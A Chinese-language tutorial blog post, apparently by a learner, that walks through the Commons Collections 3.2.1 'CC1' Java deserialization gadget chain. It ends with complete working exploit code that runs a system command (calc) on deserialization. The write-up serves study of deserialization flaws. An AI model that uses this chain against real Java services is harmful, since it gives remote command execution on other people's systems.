# JAVA安全初探(三):CC1链全分析

## 写在开篇

### Commons Collections简介

**Commons Collections**
是Apache软件基金会的一个开源项目，它提供了一组可复用的数据结构和算法的实现，旨在扩展和增强Java集合框架，以便更好地满足不同类型应用的需求。该项目包含了多种不同类型的集合类、迭代器、队列、堆栈、映射、列表、集等数据结构实现，以及许多实用程序类和算法实现。它的代码质量较高，被广泛应用于Java应用程序开发中。本文分析Commons
Collections3.2.1版本下的一条最好用的反序列化漏洞链，这条攻击链被称为CC1链(国内版本的)。

### (一)开始前的准备

#### 1.下载并配置:JDK-8u65

可以直接去官网下载，但是官网下载比较慢，于是我找到了下面这个地方可以快速下载:

**官网(慢速)**
:<https://www.oracle.com/cn/java/technologies/javase/javase8-archive-downloads.html>

![](./img/6005757041223077742.png)

![](./img/9220326190463322210.png)

**快速** :<https://blog.lupf.cn/articles/2022/02/19/1645283454543.html>

![](./img/5181938820989004075.png)

下载好后就直接允许.exe程序然后安装，接下来就是 **配置到IDEA** 里面:

大致流程:右上角文件 ------>项目结构 ------>SDK ----->添加主路径下的相应JDK ----->项目
----->将SDK切换为相应JDK

![](./img/3190265979938859253.png)

![](./img/3763913479329059158.png)

![](./img/1923436255111291763.png)

#### 2.配置Maven依赖下载CommonsCollections3.2.1版本

    
    
    <dependencies>
    <!-- https://mvnrepository.com/artifact/commons-collections/commons-collections -->
    <dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
    </dependency>
    </dependencies>
    

把上诉代码复制到pom.xml中，保存即可。

![](./img/2571070579409666515.png)

![](./img/4207740348493001994.png)

#### 3.下载并且配置相应源码

因为jdk自带的包里面有些文件是反编译的.class文件，我们没法清楚的看懂代码，为了方便我们调试，我们需要将他们转变为.java的文件，这就需要我们安装相应的源码:

**下载地址** :<https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4>

![](./img/8787509361024418393.png)

点击左下角的zip即可下载，然后解压。再进入到相应JDK的文件夹中，里面本来就有个src.zip的压缩包，我们解压到当前文件夹下，然后把之前源码包(jdk-af660750b2f4.zip)中/src/share/classes下的sun文件夹拷贝到src文件夹中去。打开IDEA，选择文件 --->项目结构
--->SDK --->源路径 --->把src文件夹添加到源路径下，保存即可。

![](./img/6748056662257652605.png)

![](./img/399876509918500520.png)

那么到此，准备工作基本告一段落了，接下来就可以开始我们的探索之旅了!!!

### (二)CC1链分析

之前的反序列化篇中有介绍过，我们利用这些漏洞的方法一般是寻找到某个带有危险方法的类，然后溯源，看看哪个类中的方法有调用危险方法(
**有点像套娃，这个类中的某个方法调用了下个类中的某个方法，一步步套下去，这里表述的可能不是特别清晰，不过没事，慢慢看下去**
)，并且继承了序列化接口，然后再依次向上回溯，直到找到一个 **重写了readObject方法** 的类，并且符合条件，那么这个就是 **起始类**
，我们可以利用这个类一步步的调用到危险方法(这里以 **"Runtime中的exec方法为例"** )，这就是大致的Java漏洞链流程。

#### 1.终点(利用点分析)

CC1链的源头就是Commons Collections库中的Tranformer接口，这个接口里面有个transform方法。

![](./img/6803408177358281028.png)

然后就是寻找下继承了这个接口的类，可以看到有好多类

![](./img/6849124257711351907.png)

我们这里找到了有重写transform方法的InvokerTransformer类，并且可以看到它也继承了Serializable,很符合我们的要求。

![](./img/8408405238101732924.png)

然后我们找到它的构造器和transform方法(在最下面):

    
    
    //含参构造器，我们在外部调用类时需要用到
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { //参数为方法名，所调用方法的参数类型，所调用方法的参数值
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }
    //重写的transform方法
    public Object transform(Object input) { //接收一个对象
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();                               //可控的获取一个完整类的原型
            Method method = cls.getMethod(iMethodName, iParamTypes);    //可控的获取该类的某个特定方法
            return method.invoke(input, iArgs);                         //调用该类的方法
          //可以看到这里相当于是调用了我们熟悉的反射机制，来返回某个方法的利用值，这就是明显的利用点
    
        } catch (NoSuchMethodException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' does not exist");
        } catch (IllegalAccessException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
        } catch (InvocationTargetException ex) {
            throw new FunctorException("InvokerTransformer: The method '" + iMethodName + "' on '" + input.getClass() + "' threw an exception", ex);
        }
    
    }
    

那么很明显，这里的参数都是可控的，那么我们就可以利用这里来调用任意类的任意方法:

    
    
    //我们来回顾一下如何利用反射调用Runtime中的exec方法
     Runtime r=Runtime.getRuntime();
     Class c=r.getClass();
     Method m=c.getMethod("exec", String.class);
     m.invoke(r,"calc");
    
    //那么我们尝试用transform方法来调用
    Runtime r=Runtime.getRuntime();
    InvokerTransformer invokerTransformer=new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}); //方法名为exec，参数类型为String，参数值为calc
    invokerTransformer.transform(r);
    
    
    
    //总结:比较上面两种方式，下面的transform相当于模拟了上诉的反射过程。
    

![](./img/3633795926470341065.png)

可以看到，成功执行了命令，那么我们就找到了源头利用点了，接下来就是一步步回溯，寻找合适的子类，构造漏洞链，直到到达重写了readObject的类(没有的话就寄了)，完成我们的"万里归途"。

#### 2.归途(漏洞链分析)

##### A.第一站(寻找某个类中的某个方法调用了transform方法)

这里直接对这个方法右键查找用法，可以看到有很多都调用了这个方法，那么我们这里直接看到我们需要的TransformedMap类下的checkSetValue方法

![](./img/5897138687833168210.png)

    
    
    //我们找到该类的构造器和checkSetValue方法
    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        //接受三个参数，第一个为Map,我们可以传入之前讲到的HashMap,第二个和第三个就是Transformer我们需要的了，可控。
            super(map);
            this.keyTransformer = keyTransformer;
            this.valueTransformer = valueTransformer; //这里是可控的
        }
    
    protected Object checkSetValue(Object value) { //接受一个对象类型的参数
        return valueTransformer.transform(value);
        //返回valueTransformer对应的transform方法，那么我们这里就需要让valueTransformer为我们之前的invokerTransformer对象
    }
    

但是这里有个问题，可以看到构造器和方法都是protected权限的，也就是说只能本类内部访问，不能外部调用去实例化，那么我们就需要找到内部实例化的工具，这里往上查找，可以找到一个public的静态方法decorate

![](./img/3267523434446313081.png)

    
    
    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer); //接受参数，实例化TransformedMap这个类
    }
    

那么就很明确了，我们可以先调用这个方法，然后实例化这个类，然后再想办法调用checkSetValue方法，算是先跨出一小步吧:

    
    
    Runtime r=Runtime.*getRuntime*();
    InvokerTransformer invokerTransformer=new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
    //invokerTransformer.transform(r);
     HashMap<Object,Object> map=new HashMap<>(); //这个直接实例化一个HashMap
    
     Map<Object,Object> transformedmap=TransformedMap.*decorate*(map,null,invokerTransformer); 
    //静态方法staic修饰直接类名＋方法名调用
    //把map当成参数传入，然后第二个参数我们用不着就赋空值null,第三个参数就是我们之前的invokerTransformer.
    

##### B.第二站(寻找合适的调用了checkSetValue的方法)

这里我们同意查找用法，发现只有一个地方调用了checkSetValue方法(AbstractInputCheckedMapDecorator类的setValue):

![](./img/1492365688810064303.png)

    
    
    static class MapEntry extends AbstractMapEntryDecorator { //这里定义的是个副类MapEntry
      private final AbstractInputCheckedMapDecorator parent;
    
    ​    protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) {
    ​        super(entry);
    ​        this.parent = parent;
    ​    }
    
    ​    public Object setValue(Object value) {
    ​        value = parent.checkSetValue(value);
    ​        return entry.setValue(value);
    ​    }
    }
    

Entry代表的是Map中的一个键值对，而我们在Map中我们可以看到有setValue方法，而我们在对Map进行遍历的时候可以调用setValue这个方法

![](./img/2835719151645857493.png)

而上面副类MapEntry实际上是重写了setValue方法，它继承了AbstractMapEntryDecorator这个类，这个类中存在setValue方法，

![](./img/6408177331807700959.png)

而这个类又引入了Map.Entry接口，所以我们只需要进行常用的Map遍历，就可以调用setValue方法,然后水到渠成地调用checkSetValue方法:

    
    
    Runtime r=Runtime.*getRuntime*();
    
    InvokerTransformer invokerTransformer=new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
    
    // invokerTransformer.transform(r); <--- 相当于下面的代码是模拟这行代码，实现相同的功能
    
     HashMap<Object,Object> map=new HashMap<>();
    
     map.put("gxngxngxn","gxngxngxn"); //给map一个键值对，方便遍历
    
     Map<Object,Object> transformedmap=TransformedMap.*decorate*(map,null,invokerTransformer);
    
     for(Map.Entry entry:transformedmap.entrySet()) { //遍历Map常用格式
             entry.setValue(r);                       //调用setValue方法，并把对象r当作对象传入
        }
    

看到这里会有点晕，我们再来梳理一边这个过程:

首先，我们找到了 **TransformedMap** 这个类，我们想要调用其中的 **checkSetValue** 方法，但是这个类的构造器是
**peotected** 权限，只能类中访问，所以我们调用 **decorate** 方法来实例化这个类，在此之前我们先实例化了一个
**HashMap** ,并且调用了 **put** 方法给他赋了一个键值对，然后把这个map当成参数传入，实例化成了一个
**transformedmap** 对象，这个对象也是Map类型的，然后我们对这个对象进行遍历，在遍历过程中我们可以调用 **setValue**
方法，而恰好又遇到了一个重写了 **setValue的副类** ，这个重写的方法刚好调用了 **checkSetValue**
方法，这样就形成了一个闭环，你就说巧不巧吧!!!!

运行结果如下图所示:

![](./img/8591599032626400648.png)

但这只是一个小插曲，终究不是我们所希望的readObject方法，我们需要一个readObject方法来代替上述的遍历Map功能。

##### C.第三站(追寻setValue)

老规矩，继续查找用法，看看有哪些方法里面调用了setValue并且可以被我们所利用，最好是直接来个重写过的readObject方法，里面调用了setValue，你说巧不巧，这不就来了吗,于是我们在
**AnnotationInvocationHandler** 这个类中看到有个调用了 **setValue** 方法的 **readObject**
方法，很完美的实现了代替之前Map遍历功能:

![](./img/1183378384693410451.png)

接下来我们找到该类的构造器:

    
    
    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        //接受两个参数，第一个是继承了注解的class，第二个是个Map,第二个参数我们可控，可以传入我们之前的transformedmap类
        Class<?>[] superInterfaces = type.getInterfaces();
        if (!type.isAnnotation() ||
            superInterfaces.length != 1 ||
            superInterfaces[0] != java.lang.annotation.Annotation.class)
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        this.type = type;
        this.memberValues = memberValues;
    }
    

可以看到这个类中的memberValues是可控的，这样我们就看传入自己需要的，然后实现serValue方法。

但是有个 **问题**
，我们可以看到定义这个类时，并没有写明public之类的声明，所以说明这个类只能在sun.reflect.annotation这个本包下被调用，我们要想在外部调用，需要用到
**反射** 来解决:

![](./img/7049565399468414314.png)

    
    
    public static void main(String[] args) throws Exception {
            Runtime r=Runtime.*getRuntime*();
            InvokerTransformer invokerTransformer=new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
    //        invokerTransformer.transform(r);
            HashMap<Object,Object> map=new HashMap<>();
            map.put("gxngxngxn","gxngxngxn");
            Map<Object,Object> transformedmap=TransformedMap.*decorate*(map,null,invokerTransformer);
    
    /*        for(Map.Entry entry:transformedmap.entrySet()) {
                entry.setValue(r);
            }*/
    
        //反射获取AnnotationInvocationHandler类
            Class c=Class.*forName*("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class); //获取构造器
            constructor.setAccessible(true); //修改作用域
            constructor.newInstance(Override.class,transformedmap); //这里第一个是参数是注解的类原型，第二个就是我们之前的类
            serialize(o);  //序列化
            unserialize("C://java/CC1.txt"); //反序列化
    
    
    ​    }
    
        //定义序列化方法
    ​    public static void serialize(Object object) throws Exception{
    ​        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("C://java/CC1.txt"));
    ​        oos.writeObject(object);
    ​    }
    
        //定义反序列化方法
    ​    public static void unserialize(String filename) throws Exception{
    ​        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(filename));
    ​        objectInputStream.readObject();
    ​    }
    

那么到这上述链子基本上就完成了，你是不是想说我们终于到达了起点，那么我们不妨满怀着激动的心情运行一下上述代码，然后就会发现，没有弹出计算器，失败了，为什么呢?看来还存在一些问题，只有当我们解决了这些问题后，才算真正的"回家"了:

#### 3.起点(入口类问题分析)

##### A.问题一

我们跟进到Runtime里看一下，发现它没有serializable接口，不能被序列化:

![](./img/2636642217456856258.png)

那么怎么办呢，我们这里可以运用反射来获取它的原型类，它的原型类class是存在serializable接口，可以序列化的

![](./img/8515808960075233045.png)

那么我们怎么获取一个实例化对象呢，这里我们看到存在一个静态的getRuntime方法，这个方法会返回一个Runtime对象，相当于是一种单例模式:

![](./img/8199982656567415011.png)

所以我们用反射:

    
    
    Class rc=Class.*forName*("java.lang.Runtime");                 //获取类原型
    Method getRuntime= rc.getDeclaredMethod("getRuntime",null);    //获取getRuntime方法，
    Runtime r=(Runtime) getRuntime.invoke(null,null);              //获取实例化对象，因为该方法无无参方法，所以全为null
    Method exec=rc.getDeclaredMethod("exec", String.class);        //获取exec方法
    exec.invoke(r,"calc");                                         //实现命令执行
    

那么上述这样就可以实现序列化，那么现在我们利用transform方法实现上述代码:

    
    
    Class rc=Class.*forName*("java.lang.Runtime");
    
    /*Method getRuntime= rc.getDeclaredMethod("getRuntime",null);
    Runtime r=(Runtime) getRuntime.invoke(null,null);
    Method exec=rc.getDeclaredMethod("exec", String.class);
    exec.invoke(r,"calc");*/
    
    //利用transform方法实现上述代码
    
            Method getRuntime= (Method) new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
    //这里模拟获取getRuntime方法，它的具体操作步骤类似之前
    
            Runtime r=(Runtime) new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntime);
    //这里模拟获取invoke方法
    
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
    //这里模拟获取exec方法，并进行命令执行
    

但是这样要一个个嵌套创建参数太麻烦了，我们这里找到了一个Commons
Collections库中存在的ChainedTransformer类，它也存在transform方法可以帮我们遍历InvokerTransformer，并且调用transform方法:

![](./img/8880267720614591550.png)

    
    
    Class rc=Class.forName("java.lang.Runtime");
    //创建一个Transformer数值用于储存InvokerTransformer的数据，便于遍历
    Transformer[] Transformers=new Transformer[]{
            new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
            new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
            new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
    };
    //调用含参构造器传入Transformer数组，然后调用transform方法，这里对象只需要传一个原始的Runtime就行，因为其他都是嵌套的。
    ChainedTransformer chainedTransformer= new ChainedTransformer(Transformers);
    chainedTransformer.transform(Runtime.class);
    

好了，现在我们这个算是替换完成，那么第一个问题也算是解决了，然后我们就可以兴高采烈的运行，结果发现还是不行，为什么啊!!!!!!!!!

##### B.问题二

那是因为之前在调用AnnotationInvocationHandler类下的readObject方法时，存在一个判断条件:

![](./img/8131585437328587244.png)

我们在此处打断点并调试跟进，可以发现此时memberType为空，所以第一个if不通过，直接结束:

![](./img/8669903338089883346.png)

这里memeberType是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，而我们所使用的注解是没有成员变量的:

![](./img/1547195714967026931.png)

而我们发现另一个注解:Target中有个名为value的成员变量，所以我们就可以使用这个注解,并改第一个键值对的值为value:

![](./img/5978338004322031805.png)

再运行会发现，这里的值变为空了，可以通过if判断，这个问题就算解决了:

![](./img/8924541512394965182.png)  
但但但是，还是不行，为为为什么?

##### C.问题三

我们继续跟进发现，在setValue的时候，我们传入的value值根本就不是我们需要的Runtime.class:

![](./img/740767267611804970.png)

这样会失败就很明显了，那么我们怎么才能将这个转换回来呢，这里就需要 **ConstantTransformer**
类，我们看到这个类里面也有transform，和构造器配合使用的话，我们传入什么值，就会返回某个值，这样就能将value的值转为
**Runtime.class**

![](./img/6082308387408973848.png)

至此，最后一个问题也解决了。

下面给出完整的CC1链:

    
    
    public static void main(String[] args) throws Exception {
            Class rc=Class.*forName*("java.lang.Runtime");
            Transformer[] Transformers=new Transformer[]{
                    new ConstantTransformer(Runtime.class), //添加此行代码，这里解决问题三
                    new InvokerTransformer("getDeclaredMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                    new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                    new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
            };
            ChainedTransformer chainedTransformer= new ChainedTransformer(Transformers);
        //上述利用反射获取类原型+transformer数组＋chainedtransformer遍历实现transform方法，来解决问题一中的无法序列化问题。
    
            HashMap<Object,Object> map=new HashMap<>();
            map.put("value","gxngxngxn"); //这里是问题二中改键值对的值为注解中成员变量的名称，通过if判断
            Map<Object,Object> transformedmap=TransformedMap.*decorate*(map,null,chainedTransformer);
            Class c=Class.*forName*("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);
            constructor.setAccessible(true);
            Object o=constructor.newInstance(Target.class,transformedmap); //这里是问题二中第一个参数改注解为Target
            *serialize*(o);
            *unserialize*("C://java/CC1.txt");
    ​    }
    ​    public static void serialize(Object object) throws Exception{
    ​        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream("C://java/CC1.txt"));
    ​        oos.writeObject(object);
    ​    }
    ​    public static void unserialize(String filename) throws Exception{
    ​        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream(filename));
    ​        objectInputStream.readObject();
    ​    }
    

运行代码，可以进行命令执行:

![](./img/5006465909350269903.png)

至此，我们也算是成功到家，完成了"万里归途".

流程简述:

transform -->checkSetValue ----> setValue ---> readObject --->问题一
--->ChainedTransformer.transform --->问题二 -->Target注解

\--->问题三 ----->ConstantTransformer.transform

### (三)写在结尾

人生中跟的第一条CC链终于结束了，花了几天的时间又是看视频，又是查资料的，虽然前面学了反射和反序列化，但是真正在跟链的过程中还是会迷糊，特别是后面解决问题的时候，花了好长时间去理清楚，这一趟下来也学到了Java代码审计和代码编写的技巧，也算是不需此行吧，当然，还是得反复去品味，才算是有真正的提升吧!!!

**参考** :

**b站白日梦组长(讲的真的特别好)**
:<https://space.bilibili.com/2142877265?spm_id_from=333.337.0.0>

